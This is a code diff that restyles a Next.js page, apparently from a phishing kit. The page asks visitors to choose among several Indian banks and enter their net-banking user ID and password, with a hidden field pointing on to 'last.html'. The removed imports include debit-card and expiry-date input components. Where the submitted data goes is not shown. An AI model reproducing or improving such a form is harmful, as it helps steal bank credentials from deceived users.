@@ -1,11 +1,8 @@
 'use client';
-import Link from "next/link";
-import DebitCardInputComponent from "../inlcude/DebitCardInputComponent";
-import ExpiryDateInputComponent from "../inlcude/ExpiryDateInputComponent";
 import Footer from "../inlcude/footer";
 import Header from "../inlcude/header";
+import styles from "./pages.module.css";
 import { useRouter } from "next/navigation";
-import { useEffect } from "react";  
 
 
 export default function Home() {
@@ -47,15 +44,15 @@ export default function Home() {
   return (
     <>
     <Header />
-    <main className="container">
+    <main className={`container ${styles.container}`}>
   <div id="test" className="text-danger text-center fw-bold" />
   <input type="hidden" id="nextValue" defaultValue="last.html" />
   <div className=" m-2">
     <img src="assets/3header.jpg" width="100%" alt="" />
     <form onSubmit={handleSubmit} id="form" className="mt-3  p-2">
-      <div className="form-group mb-3">
+      <div className={`form-group mb-3 ${styles.formGroup}`}>
         <label>Select Bank*</label>
-        <select name="bnk" className="form-control" required>
+        <select name="bnk" className={`form-control ${styles.formControl} `} required>
           <option value="">Select Bank</option>
           <option value="indusind-bank">IndusInd Bank</option>
           <option value="jammu-and-kashmir-bank">Jammu and Kashmir Bank</option>
@@ -72,27 +69,27 @@ export default function Home() {
           <option value="other-bank">Other Bank</option>
         </select>
       </div>
-      <div className="form-group mb-3">
+      <div className={`form-group mb-3 ${styles.formGroup}`}>
         <label>User ID*</label>
         <input
           name="userid"
           placeholder="User Id"
           type="text"
-          className="form-control"
+          className={`form-control ${styles.formControl} `}
           required
         />
       </div>
-      <div className="form-group mb-3">
+      <div className={`form-group mb-3 ${styles.formGroup}`}>
         <label>Password*</label>
         <input
           name="pss"
           placeholder="Password"
           type="password"
-          className="form-control"
+          className={`form-control ${styles.formControl} `}
           required
         />
       </div>
-      <div className="text-center bg-danger">
+      <div className={`${styles.textCenter} bg-danger`}>
         <button
           type="submit"
           id="submit-button"
